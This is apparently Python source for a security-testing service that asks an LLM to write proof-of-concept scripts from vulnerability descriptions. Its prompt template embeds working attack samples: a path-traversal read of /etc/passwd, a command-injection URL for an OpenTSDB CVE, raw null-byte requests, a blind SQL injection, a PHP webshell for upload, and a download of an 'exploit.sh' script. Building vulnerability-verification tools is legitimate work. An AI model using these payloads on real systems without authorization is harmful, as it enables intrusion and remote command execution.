"""
大模型服务 - 负责与LLM API交互
"""
from openai import AsyncOpenAI
from typing import Optional, Dict
from config import settings
import json
import logging

# 配置日志
logger = logging.getLogger(__name__)


class LLMService:
    """大模型API调用服务"""

    def __init__(self):
        self.api_key = settings.LLM_API_KEY
        self.api_base = settings.LLM_API_BASE
        self.temperature = settings.LLM_TEMPERATURE
        self.max_tokens = settings.LLM_MAX_TOKENS
        self.model = settings.LLM_MODEL_GENERATE  # 生成模型

        # 初始化 AsyncOpenAI 客户端（兼容硅基流动API）
        self.client = AsyncOpenAI(
            api_key=self.api_key,
            base_url=self.api_base
        )

    def update_config(self, api_key: str, model_id: str, base_url: str,
                     temperature: float = 0.7, max_tokens: Optional[int] = None):
        """
        动态更新LLM配置

        Args:
            api_key: API密钥
            model_id: 模型ID
            base_url: API基础URL
            temperature: 温度参数
            max_tokens: 最大token数
        """
        logger.info("=" * 60)
        logger.info("更新LLM配置")
        logger.info(f"新模型: {model_id}")
        logger.info(f"新Base URL: {base_url}")
        logger.info(f"温度: {temperature}")

        # 更新配置
        self.api_key = api_key
        self.model = model_id
        self.api_base = base_url
        self.temperature = temperature
        self.max_tokens = max_tokens

        # 重新初始化客户端
        self.client = AsyncOpenAI(
            api_key=self.api_key,
            base_url=self.api_base
        )

        logger.info("✅ LLM客户端已重新初始化")
        logger.info("=" * 60)

    def get_current_config(self) -> Dict[str, str]:
        """
        获取当前LLM配置（隐藏敏感信息）

        Returns:
            当前配置字典
        """
        # 隐藏API密钥，只显示前后几位
        api_key_preview = "未设置"
        if self.api_key:
            if len(self.api_key) > 10:
                api_key_preview = f"{self.api_key[:7]}...{self.api_key[-4:]}"
            else:
                api_key_preview = f"{self.api_key[:3]}***"

        return {
            "model_id": self.model,
            "base_url": self.api_base,
            "temperature": str(self.temperature),
            "max_tokens": str(self.max_tokens) if self.max_tokens else "无限制",
            "api_key_preview": api_key_preview
        }

    async def generate_initial_poc(
        self, vulnerability_info: str, target_info: Optional[str] = None
    ) -> Dict[str, Optional[str]]:
        """
        使用 GLM-4.6 生成POC代码或人工操作指南

        Args:
            vulnerability_info: 漏洞信息（描述、数据包、CVE等）
            target_info: 目标系统信息（可选）

        Returns:
            包含verifiable、poc_code或manual_steps等的字典
        """
        try:
            # 构建prompt
            prompt = self._build_prompt(vulnerability_info, target_info)

            # 调用 GLM-4.6 API
            response = await self._call_llm_api(prompt)

            # 返回完整的响应（包含verifiable字段）
            return {
                "verifiable": response.get("verifiable", True),
                "vulnerability_type": response.get("vulnerability_type"),
                "original_vulnerability_info": response.get("original_vulnerability_info"),
                "poc_code": response.get("poc_code"),
                "manual_steps": response.get("manual_steps"),
                "explanation": response.get("explanation"),
            }

        except Exception as e:
            raise Exception(f"生成POC代码失败: {str(e)}")

    def _build_prompt(self, vulnerability_info: str, target_info: Optional[str]) -> str:
        """构建发送给大模型的提示词"""
        target_section = (
            f"\n目标系统信息：{target_info}\n" if target_info else ""
        )

        # 使用字符串拼接而不是 f-string 或 format，避免花括号冲突
        prompt = """你是Web安全专家，专注漏洞验证脚本编写。

⚠️ 仅用于授权安全测试，不得包含攻击性行为。

## 漏洞信息
""" + vulnerability_info + """
""" + target_section + """

## 任务

**步骤1：判断能否用Python脚本自动化验证**

🎯 **核心判断标准：整个验证过程能否由脚本自动完成，无需人工干预**

✅ **以下情况都算可自动化：**
- 可以使用任何Python库（requests、selenium、paramiko等），可在脚本中pip安装
- 可以在脚本中创建文件、写入配置、生成payload文件
- 可以在脚本中下载工具、下载依赖文件
- 可以通过subprocess调用系统命令、执行外部工具（如nmap、sqlmap、nuclei）
- 可以启动临时服务、配置环境变量、修改系统设置
- 可以使用Selenium自动化浏览器操作
- 可以连接数据库、SSH远程执行命令
- 总之：只要脚本能自己完成，就算自动化

❌ **只有以下情况算不可自动化：**
- 需要人工点击、拖拽、输入（无法用脚本模拟的交互）
- 需要人工识别验证码（非简单图形验证码）
- 需要人工判断复杂的业务逻辑结果
- 需要物理设备操作（如插拔硬件）
- 需要人工审批、等待外部系统响应

**步骤2：根据判断返回内容**

### A. 可自动化 - 返回POC代码

**函数要求：**
```python
def scan(url):  # url已标准化为 http(s)://host:port/
    # 验证逻辑（可以包含任何自动化操作）
    # 示例自动化操作：
    # - 创建临时文件：open('/tmp/payload.txt', 'w').write(data)
    # - 下载工具：subprocess.run(['wget', 'http://...'])
    # - 安装依赖：subprocess.run(['pip', 'install', 'package'])
    # - 调用外部工具：subprocess.run(['sqlmap', '-u', url])
    # - 启动浏览器：from selenium import webdriver; driver = webdriver.Chrome()
    # - SSH连接：import paramiko; ssh.connect(host, username, password)

    return {{
        "vulnerable": True/False,
        "reason": "判断依据（必须使用中文）",
        "details": "详细信息（必须使用中文）"
    }}
```

**⚠️ Python f-string 花括号转义规则（极其重要！）：**
如果你的代码中使用了 f-string（f"..." 或 f'''...'''），并且字符串内容包含花括号 {{ 或 }}：
- ✅ **正确**：字面量花括号必须写成双花括号 {{{{ 和 }}}}
- ❌ **错误**：单花括号会被Python解释为格式化占位符，导致语法错误

**示例：**
```python
# ❌ 错误写法（会导致 SyntaxError）
payload = f'''
单花括号 null restore 单花括号 stopped 单花括号 pop 单花括号 if
mark /OutputFile (%pipe%单花括号command单花括号) device
'''

# ✅ 正确写法（所有字面量花括号都要加倍）
payload = f'''
双花括号 null restore 双花括号 stopped 双花括号 pop 双花括号 if
mark /OutputFile (%pipe%单花括号command单花括号) device
'''
```

**⚠️ 重要：返回值中的 reason 和 details 字段必须使用中文！**

**💡 脚本可以完成的自动化操作示例：**
```python
# 1. 创建配置文件
with open('config.ini', 'w') as f:
    f.write('[settings]\\nhost=example.com')

# 2. 下载payload文件
import urllib.request
urllib.request.urlretrieve('http://example.com/exploit.sh', 'exploit.sh')

# 3. 调用系统工具
import subprocess
subprocess.run(['nmap', '-p', '80,443', target])

# 4. 自动化浏览器
from selenium import webdriver
driver = webdriver.Chrome()
driver.get(url)

# 5. 动态安装依赖
subprocess.run(['pip', 'install', 'paramiko', '-q'])
```

**🔍 多路径探测策略（针对文件上传等需要找端点的漏洞）：**

如果漏洞需要访问特定端点（如文件上传、API接口等），但你不确定确切路径，**必须实现自动探测**：

```python
def scan(url):
    # 定义可能的端点路径列表
    possible_paths = [
        '/',              # 根路径（最常见）
        '/upload',        # REST风格
        '/upload.php',    # PHP应用
        '/api/upload',    # API风格
        '/file/upload',   # 分类路径
        '/index.php',     # PHP首页
        ''                # 空路径
    ]

    for path in possible_paths:
        try:
            target_url = url.rstrip('/') + path if path else url
            response = requests.post(target_url, files=files, timeout=10)

            # 如果返回2xx或3xx，认为找到了有效端点
            if 200 <= response.status_code < 400:
                # 在这个端点上继续验证漏洞
                break
        except Exception:
            continue

    # 如果所有路径都失败，返回未找到
    if not found:
        return {{
            "vulnerable": False,
            "reason": "未找到有效的上传端点",
            "details": f"已尝试路径：{{', '.join(possible_paths)}}"
        }}
```

**适用场景：**
- 文件上传漏洞（CVE-2017-8291、任意文件上传等）
- API接口漏洞（未授权访问、参数注入等）
- 路径相关漏洞（目录遍历、文件包含等）

**🚨 URL处理关键（目录遍历必看）：**
```python
# ❌ 错误：requests会自动规范化路径
payload = '/static/../../../etc/passwd'
full_url = url.rstrip('/') + payload
# 实际发送: http://example.com/etc/passwd (../被清理)

# ✅ 正确：URL编码绕过规范化
payload = '/static/%2e%2e/%2e%2e/%2e%2e/etc/passwd'  # %2e=点 %2f=斜杠
full_url = url.rstrip('/') + payload
# 实际发送: http://example.com/static/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

**🎯 命令注入与URL编码核心原则（极其重要！）：**

命令注入漏洞的payload包含**两个层面**，必须正确处理才能成功利用：

**层面1：Payload语法层（注入目标的语法）**
- 这是被注入系统（如gnuplot、bash、SQL等）能理解的语法
- 例如：`system('touch /tmp/file')`中的单引号、括号是gnuplot语法
- **关键**：这些语法字符（单引号、双引号、括号、分号等）**绝对不能被URL编码**
- 如果编码了，目标系统无法识别，payload失效

**层面2：URL传输层（HTTP协议要求）**
- 这是URL中不能直接出现的字符，必须编码
- 例如：空格、`<`、`>`、`&`、`#`等
- **关键**：只编码这些会破坏URL结构的字符

**编码决策树：**
```python
# 步骤1：先构造完整的payload语法
payload_syntax = "system('touch /tmp/file')"  # 保持语法完整

# 步骤2：只编码URL层面的特殊字符
def safe_encode(text):
    # ✅ 只编码这些字符
    return text.replace(' ', '%20')      # 空格
               .replace('<', '%3C')      # 小于号
               .replace('>', '%3E')      # 大于号
               .replace('&', '%26')      # &符号（如果在参数值中）
               .replace('#', '%23')      # 井号
    # ❌ 不要编码这些
    # 保持单引号 '  双引号 "  括号 ()  分号 ;  等号 =  斜杠 / 等

payload_encoded = safe_encode(payload_syntax)
# 结果: system('touch%20/tmp/file')
```

**❌ 常见错误示例（OpenTSDB CVE-2020-35476）：**
```python
# 错误1：使用urllib.parse.quote()过度编码
import urllib.parse
payload = "system('touch /tmp/file')"
encoded = urllib.parse.quote(payload)
# 结果: system%28%27touch%20/tmp/file%27%29
# 问题：括号和单引号被编码，gnuplot无法识别

# 错误2：手动编码单引号
payload_url = f"yrange=[0:system(%27touch%20/tmp/file%27)]"
# 问题：%27（编码后的单引号）破坏了gnuplot语法

# 错误3：忘记编码空格
payload_url = f"yrange=[0:system('touch /tmp/file')]"
# 问题：空格会被URL解析器截断或误解析
```

**✅ 正确做法：**
```python
# OpenTSDB命令注入示例
command = 'touch /tmp/poc_test'
command_encoded = command.replace(' ', '%20')  # 只编码空格

payload_url = (
    f'{{url}}/q?start=2000/10/21-00:00:00&'
    f'end=2020/25/01-13:10:32&'           # 确保所有必需参数都存在
    f'm=sum:metric.name&'
    f'yrange=[0:system(\\'{command_encoded}\\')]&'  # 单引号保持不变
    f'wxh=1516x644&style=linespoint&grid=t'
)

# 实际发送的URL：
# /q?...&yrange=[0:system('touch%20/tmp/poc_test')]&...
# gnuplot能正确解析：system('touch /tmp/poc_test')
```

**🔍 API参数完整性检查：**

很多Web API对参数有严格要求，缺少必需参数会返回400/422错误：

```python
def scan(url):
    # ✅ 好习惯：先用正常参数测试API是否可访问
    test_url = f'{{url}}/api/endpoint?param1=value1&param2=value2'
    test_response = requests.get(test_url, timeout=10)

    if test_response.status_code == 400:
        # 可能缺少必需参数，查看错误消息
        error_msg = test_response.text
        # 根据错误消息补充参数

    # 然后再注入payload
    payload_url = f'{{url}}/api/endpoint?param1=value1&param2=value2&inject={{payload}}'
```

**适用场景：**
- 命令注入（OS Command Injection）
- SQL注入（需要保持SQL语法）
- SSTI注入（需要保持模板语法）
- XSS注入（需要保持JavaScript语法）
- 任何需要向目标系统注入代码/命令的漏洞

**🔥 空字节与特殊字节处理（CVE-2013-4547等漏洞必看）：**

某些漏洞需要在HTTP请求中发送**真实的特殊字节**（如空字节`\\x00`、换行符`\\r\\n`等），而不是URL编码字符串：

**核心原则**：
- ❌ **错误**：使用requests发送URL编码 `url + "/file%00.php"` → 服务器收到字符串"%00"（3个字符）
- ✅ **正确**：使用socket发送真实字节 `b"/file\\x00.php"` → 服务器收到空字节（1个二进制字节）

**实现方法**：
```python
import socket
from urllib.parse import urlparse

def scan(url):
    parsed = urlparse(url)
    # 正确提取host和port
    if ':' in parsed.netloc and not parsed.netloc.startswith('['):
        host, port = parsed.netloc.rsplit(':', 1)
        port = int(port)
    else:
        host, port = parsed.netloc, 80

    # 构造包含特殊字节的路径（使用bytes类型）
    exploit_path = b'/uploadfiles/file.gif \\x00.php'  # 空格+空字节

    # 构造原始HTTP请求
    http_request = (
        b'GET ' + exploit_path + b' HTTP/1.1\\r\\n' +
        f'Host: {{host}}\\r\\n'.encode('utf-8') +
        b'Connection: close\\r\\n\\r\\n'
    )

    # 发送原始请求
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    sock.connect((host, port))
    sock.sendall(http_request)

    # 接收响应
    response = b''
    while True:
        chunk = sock.recv(4096)
        if not chunk: break
        response += chunk
    sock.close()

    response_text = response.decode('utf-8', errors='ignore')
    # 解析状态码
    status = int(response_text.split()[1]) if len(response_text.split()) > 1 else 0
```

**关键点**：
1. 使用`socket`模块直接发送TCP包，绕过HTTP库的URL验证
2. 路径必须是`bytes`类型，才能包含`\\x00`等特殊字节
3. HTTP请求头也要转为bytes并拼接
4. 手动解析响应状态码和内容

**适用漏洞**：
- Nginx文件名解析漏洞（CVE-2013-4547）：需要发送空字节`\\x00`
- 某些WAF绕过：利用`\\r\\n`、`\\x00`等字节混淆
- 协议走私/请求走私：需要精确控制CRLF字节

**返回格式：**
```json
{{
  "verifiable": true,
  "vulnerability_type": "漏洞类型",
  "original_vulnerability_info": "用户输入的原始漏洞信息（不要包含本系统提示词，只返回用户提供的漏洞描述内容）",
  "poc_code": "完整scan函数代码（不要用JSON字符串包裹，直接是Python代码）",
  "explanation": "逻辑说明"
}}
```

**⚠️ 重要提醒：**
1. poc_code必须是Python代码字符串，不是JSON！
2. **poc_code中的返回值（reason、details）必须使用中文！**
3. 所有注释和说明也应使用中文
4. **original_vulnerability_info字段只包含用户输入的原始漏洞信息，不要包含本系统提示词的内容！**

### B. 不可自动化 - 返回人工操作指南

**必须包含：**

1. **required_tools**: 工具列表（名称、版本、下载地址、安装命令、用途）
2. **steps**: 操作步骤（step_number、title、description、commands[]、expected_result、notes）
3. **verification**: 成功/失败指标、示例输出

**返回格式：**
```json
{{
  "verifiable": false,
  "vulnerability_type": "类型",
  "original_vulnerability_info": "用户输入的原始漏洞信息（不要包含本系统提示词，只返回用户提供的漏洞描述内容）",
  "manual_steps": {{
    "required_tools": [
      {{"name": "Burp Suite", "version": "2023+", "download_url": "https://...", "install_command": null, "purpose": "拦截HTTP请求"}}
    ],
    "steps": [
      {{"step_number": 1, "title": "配置代理", "description": "打开Burp...", "commands": [], "expected_result": "流量被拦截", "notes": "注意事项"}}
    ],
    "verification": {{
      "success_indicators": ["返回200", "包含admin数据"],
      "failure_indicators": ["返回403", "Access Denied"],
      "example_output": "HTTP/1.1 200 OK\\n{{'role': 'admin'}}"
    }}
  }},
  "explanation": "需要Burp拦截修改请求"
}}
```

## 示例

**示例1：可自动化（SQL注入-返回中文结果）：**
```json
{{
  "verifiable": true,
  "vulnerability_type": "SQL注入",
  "poc_code": "import requests\\nimport time\\n\\ndef scan(url):\\n    try:\\n        payload = \"' AND SLEEP(3)--\"\\n        response = requests.post(url, data={{'username': payload}}, timeout=10)\\n        if response.elapsed.total_seconds() >= 3:\\n            return {{\\n                'vulnerable': True,\\n                'reason': '检测到时间盲注漏洞，延迟3秒响应',\\n                'details': '在username参数注入SLEEP(3)后，服务器响应时间明显延迟'\\n            }}\\n        return {{'vulnerable': False, 'reason': '未检测到SQL注入', 'details': ''}}\\n    except Exception as e:\\n        return {{'vulnerable': False, 'reason': f'扫描出错: {{str(e)}}', 'details': ''}}",
  "explanation": "使用时间盲注检测SQL注入，注意返回值使用中文"
}}
```

**示例2：可自动化（需要调用sqlmap工具）：**
```json
{{"verifiable": true, "vulnerability_type": "SQL注入（深度检测）", "poc_code": "import subprocess\\nimport json\\ndef scan(url):\\n    result = subprocess.run(['sqlmap', '-u', url, '--batch', '--json'], capture_output=True)\\n    ...", "explanation": "脚本自动调用sqlmap工具完成深度检测"}}
```

**示例3：可自动化（需要Selenium浏览器自动化）：**
```json
{{"verifiable": true, "vulnerability_type": "XSS存储型", "poc_code": "from selenium import webdriver\\ndef scan(url):\\n    driver = webdriver.Chrome()\\n    driver.get(url)\\n    ...", "explanation": "使用Selenium自动化浏览器操作，验证XSS"}}
```

**示例4：可自动化（需要创建文件+下载工具）：**
```json
{{"verifiable": true, "vulnerability_type": "文件上传漏洞", "poc_code": "import os\\nimport subprocess\\ndef scan(url):\\n    # 创建webshell文件\\n    with open('shell.php', 'w') as f:\\n        f.write('<?php system($_GET[\"cmd\"]); ?>')\\n    ...", "explanation": "脚本自动创建payload文件并上传验证"}}
```

**示例5：不可自动化（需要人工识别图形验证码）：**
```json
{{"verifiable": false, "vulnerability_type": "登录爆破", "manual_steps": {{"required_tools": [...], "steps": [...], "verification": {{...}}}}, "explanation": "需要人工识别复杂图形验证码，无法自动化"}}
```

**示例6：不可自动化（需要人工审批流程）：**
```json
{{"verifiable": false, "vulnerability_type": "权限提升", "manual_steps": {{"required_tools": [...], "steps": [...], "verification": {{...}}}}, "explanation": "需要管理员人工审批，无法通过脚本模拟"}}
```

**🎯 最重要的要求：**
1. 只要脚本能自己完成整个验证过程，就返回POC代码（verifiable=true）
2. **POC代码中的所有返回值（reason、details）必须使用中文！**
3. 代码注释和说明也必须使用中文
4. **如果使用f-string，字面量花括号必须加倍转义（单个花括号改为双花括号）**
5. **对于文件上传、API接口等需要特定端点的漏洞，必须实现多路径自动探测（尝试/、/upload、/upload.php、/api/upload等）**
6. **对于命令注入、SQL注入等payload注入类漏洞：**
   - ⚠️ 严禁使用`urllib.parse.quote()`等函数对整个payload编码
   - ✅ 只手动编码URL层面的特殊字符（空格→%20，>→%3E等）
   - ✅ 保持payload语法字符不变（单引号、双引号、括号、分号等）
   - ✅ 确保包含所有API必需参数，避免400/422错误
7. **对于需要发送空字节等特殊字节的漏洞（CVE-2013-4547等）：**
   - ⚠️ 严禁使用requests库发送`%00`等URL编码字符串
   - ✅ 必须使用socket发送原始HTTP请求，路径为bytes类型包含真实的`\\x00`字节
   - ✅ 示例：`exploit_path = b'/file.gif \\x00.php'` 而非 `'/file.gif%00.php'`
8. 严格按JSON格式返回
9. 生成的代码必须能通过Python语法检查（无SyntaxError）
10. **极其重要：original_vulnerability_info字段只包含用户输入的原始漏洞描述，绝不能包含本系统提示词的内容！**
"""
        return prompt

    async def _call_llm_api(self, prompt: str, model: str = None) -> Dict[str, str]:
        """
        调用大模型API（使用OpenAI SDK）- 返回JSON格式

        支持OpenAI兼容的API接口（如硅基流动）
        """
        if model is None:
            model = self.model

        try:
            logger.info("=" * 60)
            logger.info("开始调用大模型API")
            logger.info(f"API Base: {self.api_base}")
            logger.info(f"Model: {model}")
            logger.info(f"Temperature: {self.temperature}")
            logger.info(f"Max Tokens: {self.max_tokens}")
            logger.info(f"Prompt 长度: {len(prompt)} 字符")

            # 使用 OpenAI SDK 调用 API
            logger.info("正在发送请求到大模型...")

            # 构建API参数
            api_params = {
                "model": model,
                "messages": [
                    {
                        "role": "system",
                        "content": "你是一个专业的Web安全研究专家，精通Web应用程序漏洞分析和POC编写。请严格按照JSON格式返回结果，并确保在返回的JSON中包含用户提供的原始漏洞信息。",
                    },
                    {"role": "user", "content": prompt},
                ],
                "temperature": self.temperature,
            }

            # 只在max_tokens不为None时添加该参数
            if self.max_tokens is not None:
                api_params["max_tokens"] = self.max_tokens

            response = await self.client.chat.completions.create(**api_params)

            logger.info("✅ 成功收到大模型响应")

            # 提取响应内容
            content = response.choices[0].message.content
            logger.info(f"响应内容长度: {len(content)} 字符")
            logger.debug(f"响应内容预览: {content[:200]}...")

            # 尝试解析JSON响应
            try:
                # 先尝试清理可能存在的markdown代码块标记
                cleaned_content = content.strip()
                if cleaned_content.startswith("```json"):
                    cleaned_content = cleaned_content[7:]
                if cleaned_content.startswith("```"):
                    cleaned_content = cleaned_content[3:]
                if cleaned_content.endswith("```"):
                    cleaned_content = cleaned_content[:-3]
                cleaned_content = cleaned_content.strip()

                parsed_content = json.loads(cleaned_content)

                # 清理poc_code字段中可能存在的markdown代码块标记
                if "poc_code" in parsed_content and parsed_content["poc_code"]:
                    poc_code = parsed_content["poc_code"].strip()
                    # 移除开头的代码块标记
                    if poc_code.startswith("```python"):
                        poc_code = poc_code[9:]
                    elif poc_code.startswith("```"):
                        poc_code = poc_code[3:]
                    # 移除结尾的代码块标记
                    if poc_code.endswith("```"):
                        poc_code = poc_code[:-3]
                    parsed_content["poc_code"] = poc_code.strip()

                logger.info("✅ JSON解析成功")
                logger.info("=" * 60)
                return parsed_content
            except json.JSONDecodeError as json_err:
                logger.warning(f"JSON解析失败: {str(json_err)}")
                logger.info("将整个响应作为 poc_code 返回")
                logger.info("=" * 60)
                # 如果不是JSON格式，将整个内容作为poc_code返回
                return {
                    "poc_code": content,
                    "explanation": "代码已生成，请仔细审查后使用。",
                }

        except Exception as e:
            # 提供更详细的错误信息
            error_type = type(e).__name__
            error_msg = str(e)

            logger.error("=" * 60)
            logger.error(f"❌ API调用失败")
            logger.error(f"异常类型: {error_type}")
            logger.error(f"错误详情: {error_msg}")

            # 如果是 OpenAI SDK 的异常，提供更多信息
            if hasattr(e, 'response'):
                logger.error(f"HTTP状态码: {getattr(e.response, 'status_code', 'N/A')}")
                logger.error(f"响应内容: {getattr(e.response, 'text', 'N/A')[:500]}")

            logger.error("=" * 60)

            raise Exception(f"API调用异常: {error_type} - {error_msg}")


# 创建全局服务实例
llm_service = LLMService()